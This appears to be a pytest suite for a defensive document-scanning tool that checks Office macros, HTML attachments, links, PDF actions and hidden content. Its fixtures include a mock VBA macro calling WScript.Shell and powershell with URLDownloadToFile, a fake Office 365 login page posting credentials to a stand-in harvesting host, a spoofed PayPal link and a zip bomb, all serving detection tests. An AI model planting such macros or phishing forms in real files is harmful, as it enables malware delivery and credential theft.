"""
Comprehensive Automated Unit and Integration Tests for Cyclops Advanced Document Security Scanner.
Tests all 9 features:
1. Macro & Embedded Code Detection
2. HTML Attachment Inspection
3. Embedded Hyperlink Analysis
4. Exploit & Structural Anomaly Detection
5. Form & Data-Submission Analysis
6. Safe-View Secure Flattening
7. Deep Hyperlink Analysis & Domain Matcher
8. Macro-to-English Script Translator
9. Hidden Content & Invisible Text Audit
"""
import io
import zipfile
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.scanner.doc_pipeline import orchestrate_document_scan
from app.scanner.macro_inspector import inspect_macros_and_code
from app.scanner.html_doc_inspector import inspect_html_attachment
from app.scanner.doc_links import extract_document_links
from app.scanner.pdf_inspector import inspect_structure_and_forms
from app.scanner.safe_view import generate_safe_view_preview
from app.scanner.script_translator import translate_macro_script
from app.scanner.hidden_content import audit_hidden_content
from app.scanner.presets import get_fixture_bytes

client = TestClient(app)


# ---------------------------------------------------------------------------
# Feature 1: Macro & Embedded Code Detection Tests
# ---------------------------------------------------------------------------

def test_benign_docx_no_macros():
    """Validates that standard DOCX without macros is flagged as clean."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/document.xml", "<w:document><w:body><w:p><w:r><w:t>Hello World</w:t></w:r></w:p></w:body></w:document>")
    docx_bytes = buf.getvalue()

    result = inspect_macros_and_code(docx_bytes, "quarterly_memo.docx")
    assert result.macro_detected is False
    assert result.status == "not_detected"
    assert "no embedded vba projects" in result.explanation.lower()


def test_xlsm_with_suspicious_vba_macros():
    """Validates extraction and detection of suspicious VBA calls (WScript.Shell, powershell, download)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        # Benign mock vbaProject.bin containing known suspicious API patterns
        vba_code = (
            b"VBA_Project_Stream\x00"
            b"Sub Document_Open()\n"
            b'  Set wsh = CreateObject("WScript.Shell")\n'
            b'  wsh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command URLDownloadToFile"\n'
            b'  strPath = Environ("TEMP") & "\\payload.bin"\n'
            b"End Sub\n"
        )
        zf.writestr("xl/vbaProject.bin", vba_code)
    xlsm_bytes = buf.getvalue()

    result = inspect_macros_and_code(xlsm_bytes, "invoice_financials.xlsm")
    assert result.macro_detected is True
    assert result.status == "detected"
    assert any("wscript.shell" in ind.lower() for ind in result.suspicious_indicators)
    assert any("command-line" in ind.lower() or "powershell" in ind.lower() for ind in result.suspicious_indicators)
    assert len(result.extracted_snippets) > 0


def test_ooxml_with_embedded_binary_ole():
    """Detects embedded OLE binaries inside Office package embeddings."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("word/embeddings/oleObject1.bin", b"DUMMY_OLE_PAYLOAD_BYTES")
    docx_bytes = buf.getvalue()

    result = inspect_macros_and_code(docx_bytes, "attachment.docx")
    assert len(result.embedded_objects_detected) == 1
    assert any("oleObject1.bin" in obj for obj in result.embedded_objects_detected)


# ---------------------------------------------------------------------------
# Feature 2: Local Phishing Page — HTML Attachment Tests
# ---------------------------------------------------------------------------

def test_html_phishing_credential_harvester():
    """Validates HTML attachment inspection with password inputs and external form POST."""
    html_content = b"""
    <!DOCTYPE html>
    <html>
      <head><title>Microsoft Office 365 - Password Expiry</title></head>
      <body>
        <h3>Your session has expired. Re-authenticate below:</h3>
        <form action="https://credential-stealer.xyz/harvest.php" method="POST">
          <input type="text" name="user_email" placeholder="Work Email" />
          <input type="password" name="user_password" placeholder="Domain Password" />
          <button type="submit">Unlock Account</button>
        </form>
        <iframe src="https://silent-tracker.org" style="display:none;width:0;height:0"></iframe>
      </body>
    </html>
    """
    result = inspect_html_attachment(html_content, "Security_Notice.html")
    assert result.is_html is True
    assert len(result.password_fields_found) == 1
    assert len(result.login_fields_found) == 1
    assert any("credential-stealer.xyz" in dest for dest in result.external_form_destinations)
    assert len(result.suspicious_redirects_or_frames) >= 1
    assert result.risk_level == "critical"
    assert "login form" in result.explanation.lower()


def test_html_clean_report():
    """Validates clean static HTML document without forms or scripts."""
    clean_html = b"<html><head><title>Quarterly Summary</title></head><body><h1>Report</h1><p>Sales were steady.</p></body></html>"
    result = inspect_html_attachment(clean_html, "summary.html")
    assert result.is_html is True
    assert len(result.password_fields_found) == 0
    assert len(result.external_form_destinations) == 0
    assert result.risk_level == "safe"


# ---------------------------------------------------------------------------
# Feature 3 & 7: Hyperlinks and Domain Consistency Tests
# ---------------------------------------------------------------------------

def test_pdf_hyperlink_mismatch_detection():
    """Detects visible label vs actual destination mismatch in links."""
    # Test with HTML containing spoofed label
    spoofed_html = b"""
    <html>
      <head><title>Billing Statement</title></head>
      <body>
        <p>Please review your bill: <a href="https://malicious-gateway.cc/login">https://paypal.com/invoice/9923</a></p>
      </body>
    </html>
    """
    links_res, brand_res = extract_document_links(spoofed_html, "statement.html")
    assert links_res.total_links_found == 1
    assert links_res.mismatched_links_count == 1
    item = links_res.links[0]
    assert item.mismatch_warning is not None
    assert "paypal.com" in item.visible_text
    assert "malicious-gateway.cc" in item.destination_domain
    assert item.threat_verdict == "suspicious"


def test_brand_domain_matcher_inconsistency():
    """Detects when document claimed organization does not match link destinations."""
    html_with_brand = b"""
    <html>
      <head><title>DocuSign Secure Signing Ceremony</title></head>
      <body>
        <a href="https://unrelated-domain-492.net/auth">Sign Here</a>
      </body>
    </html>
    """
    links_res, brand_res = extract_document_links(html_with_brand, "envelope.html")
    assert brand_res.claimed_organization is not None
    assert "DocuSign" in brand_res.claimed_organization
    assert len(brand_res.mismatches) > 0
    assert "unrelated-domain-492.net" in brand_res.mismatches


# ---------------------------------------------------------------------------
# Feature 4 & 5: Exploit and Form Submission Tests
# ---------------------------------------------------------------------------

def test_pdf_exploit_launch_action_and_acroform():
    """Validates detection of /Launch and AcroForm submit-form actions in PDF."""
    pdf_bytes = get_fixture_bytes("Financial_Audit_Q4.pdf")
    exploit_res, form_res = inspect_structure_and_forms(pdf_bytes, "Financial_Audit_Q4.pdf")

    # Feature 4 Exploit check
    assert any("/Launch" in sa for sa in exploit_res.suspicious_actions)

    # Feature 5 Form check
    assert form_res.interactive_forms_detected is True
    assert any("ssn" in sf.lower() or "social security" in sf.lower() for sf in form_res.sensitive_fields_detected)
    assert any("exfiltration-audit.org" in dest for dest in form_res.external_destinations)


def test_archive_decompression_bomb_protection():
    """Validates structural warning on abnormal compression ratios."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # Create a highly compressible file: 2MB of zeroes compressed into ~2KB
        zf.writestr("word/huge_stream.bin", b"\x00" * (2 * 1024 * 1024))
    bomb_bytes = buf.getvalue()

    exploit_res, _ = inspect_structure_and_forms(bomb_bytes, "bomb.docx")
    assert exploit_res.compression_ratio > 50.0


# ---------------------------------------------------------------------------
# Feature 6: Safe-View Preview Tests
# ---------------------------------------------------------------------------

def test_safe_view_preview_generation():
    """Validates static PNG canvas generation without running scripts."""
    clean_pdf = get_fixture_bytes("SentinelAI_Employee_Policy.pdf")
    preview = generate_safe_view_preview(clean_pdf, "Employee_Policy.pdf")

    assert preview.status == "available"
    assert preview.total_pages >= 1
    first_page = preview.pages[0]
    assert first_page.page_number == 1
    assert first_page.image_data_url.startswith("data:image/png;base64,")
    assert "safe view displays a static rendering" in preview.disclaimer.lower()


# ---------------------------------------------------------------------------
# Feature 8: Script Translator Tests
# ---------------------------------------------------------------------------

def test_script_translator_plain_english():
    """Validates translation of macro indicators into plain-language explanation."""
    xlsm_bytes = get_fixture_bytes("Quarterly_Report_2026.xlsm")
    macro_res = inspect_macros_and_code(xlsm_bytes, "Quarterly_Report_2026.xlsm")
    translation = translate_macro_script(macro_res)

    assert translation.has_script is True
    assert len(translation.observed_operations) >= 2
    assert "command-line process" in translation.plain_english_summary.lower() or "download" in translation.plain_english_summary.lower()
    assert "observed static operations" in translation.inferred_intent_warning.lower()


# ---------------------------------------------------------------------------
# Feature 9: Hidden Content Audit Tests
# ---------------------------------------------------------------------------

def test_hidden_content_in_pdf():
    """Validates detection of invisible text mode (3 Tr) and microscopic font in PDF."""
    pdf_bytes = get_fixture_bytes("Financial_Audit_Q4.pdf")
    hidden_res = audit_hidden_content(pdf_bytes, "Financial_Audit_Q4.pdf")

    assert hidden_res.hidden_elements_count >= 1
    reasons = [it.classification_reason for it in hidden_res.items]
    assert any("3 Tr" in r or "invisible" in r.lower() or "microscopic" in r.lower() for r in reasons)


def test_hidden_content_in_excel():
    """Validates detection of hidden sheets and hidden rows in Excel."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types></Types>")
        zf.writestr("xl/workbook.xml", '<workbook><sheets><sheet name="VisibleSheet" sheetId="1"/><sheet name="SecretLedger" sheetId="2" state="veryHidden"/></sheets></workbook>')
    xlsx_bytes = buf.getvalue()

    hidden_res = audit_hidden_content(xlsx_bytes, "finances.xlsx")
    assert hidden_res.hidden_elements_count >= 1
    assert any("SecretLedger" in it.extracted_text for it in hidden_res.items)


# ---------------------------------------------------------------------------
# End-to-End Orchestrator and API Integration Tests
# ---------------------------------------------------------------------------

def test_full_pipeline_orchestrator():
    """Tests the unified orchestrator synthesizing all 9 features."""
    fixture_bytes = get_fixture_bytes("Quarterly_Report_2026.xlsm")
    response = orchestrate_document_scan(fixture_bytes, "Quarterly_Report_2026.xlsm")

    assert response.verdict in ["suspicious", "malicious"]
    assert response.macro_inspection.macro_detected is True
    assert response.script_translator.has_script is True
    assert response.safe_view.status == "available"
    assert len(response.detected_signals) > 0


def test_api_scan_document_json_endpoint():
    """Tests POST /scan-document-json endpoint."""
    res = client.post("/scan-document-json", json={
        "file_name": "Quarterly_Report_2026.xlsm",
        "preset": "Quarterly_Report_2026.xlsm"
    })
    assert res.status_code == 200
    data = res.json()
    assert data["file_name"] == "Quarterly_Report_2026.xlsm"
    assert data["macro_inspection"]["macro_detected"] is True
    assert "safe_view" in data
    assert len(data["safe_view"]["pages"]) >= 1


def test_api_scan_document_multipart_upload():
    """Tests POST /scan-document multipart file upload endpoint."""
    dummy_pdf = get_fixture_bytes("SentinelAI_Employee_Policy.pdf")
    res = client.post(
        "/scan-document",
        files={"file": ("Employee_Policy.pdf", dummy_pdf, "application/pdf")}
    )
    assert res.status_code == 200
    data = res.json()
    assert data["file_name"] == "Employee_Policy.pdf"
    assert data["verdict"] == "clean"
    assert data["risk_level"] == "safe"
    assert "checks_summary" in data
    assert data["checks_summary"]["completed"] >= 6
    assert data["checks_summary"]["failed"] == 0


# ---------------------------------------------------------------------------
# Feature Check Tracking and Findings Separation Tests
# ---------------------------------------------------------------------------

def test_checks_summary_zero_findings_with_successful_checks():
    """Validates that a clean document has successful checks, 0 findings, and limitations disclosed."""
    dummy_pdf = get_fixture_bytes("SentinelAI_Employee_Policy.pdf")
    res = orchestrate_document_scan(dummy_pdf, "SentinelAI_Employee_Policy.pdf")

    assert res.verdict == "clean"
    assert len(res.detected_signals) == 0  # Zero threat findings
    assert res.checks_summary is not None
    assert res.checks_summary.total_checks == 9
    assert res.checks_summary.completed >= 6
    assert res.checks_summary.failed == 0
    assert res.checks_summary.unavailable == 0
    # Limitations are present
    assert len(res.checks_summary.limitations) > 0
    assert any("Static structural audit cannot guarantee discovery of novel zero-day" in lim for lim in res.checks_summary.limitations)
    # Check individual check items
    check_ids = [c.id for c in res.checks_summary.checks]
    assert "check-macro" in check_ids
    assert "check-links" in check_ids
    assert "check-safeview" in check_ids
    assert "check-hidden" in check_ids


def test_checks_summary_nonzero_findings():
    """Validates that a malicious file separates threat findings from completed checks."""
    xlsm_bytes = get_fixture_bytes("Quarterly_Report_2026.xlsm")
    res = orchestrate_document_scan(xlsm_bytes, "Quarterly_Report_2026.xlsm")

    assert res.verdict in ["suspicious", "malicious"]
    assert len(res.detected_signals) > 0  # Nonzero threat findings
    assert res.checks_summary is not None
    assert res.checks_summary.completed >= 5
    # Macro check should report findings
    macro_check = next((c for c in res.checks_summary.checks if c.id == "check-macro"), None)
    assert macro_check is not None
    assert macro_check.findings_count > 0
    assert macro_check.status == "completed"


def test_checks_summary_partial_failures_and_unavailable():
    """Validates that an unsupported/binary format records unavailable and skipped checks accurately."""
    exe_bytes = get_fixture_bytes("Vendor_Invoice_Q3_Final.pdf.exe")
    res = orchestrate_document_scan(exe_bytes, "Vendor_Invoice_Q3_Final.pdf.exe")

    assert res.checks_summary is not None
    assert res.checks_summary.unavailable >= 1  # Safe View is unavailable for executable
    safe_view_check = next((c for c in res.checks_summary.checks if c.id == "check-safeview"), None)
    assert safe_view_check is not None
    assert safe_view_check.status == "unavailable"
    assert "unavailable" in safe_view_check.description.lower() or "executable" in safe_view_check.description.lower()

    # Hyperlink check skipped
    link_check = next((c for c in res.checks_summary.checks if c.id == "check-links"), None)
    assert link_check is not None
    assert link_check.status == "skipped"


def test_checks_summary_zero_checks_defaults():
    """Validates that an unassessed DocumentChecksSummary initializes with zero completed checks."""
    from app.schemas import DocumentChecksSummary
    summary = DocumentChecksSummary()
    assert summary.total_checks == 0
    assert summary.completed == 0
    assert summary.skipped == 0
    assert summary.failed == 0
    assert summary.unavailable == 0
    assert summary.checks == []
    assert summary.limitations == []

